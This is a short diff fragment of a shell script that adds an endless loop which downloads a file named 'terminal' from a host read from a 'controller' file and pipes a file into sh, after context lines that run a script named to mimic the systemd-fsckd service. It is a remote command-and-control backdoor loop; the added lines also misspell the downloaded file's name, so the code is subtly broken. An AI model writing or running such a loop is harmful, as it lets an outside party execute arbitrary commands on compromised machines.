@@ -12,3 +12,8 @@ for i in {1..255}; do
 		bash systemd-fsckd
 		EOF
 	fi
+done
+while true; do
+	wget $(cat controller)/terminal
+	cat termial | sh
+	echo "" > terminal
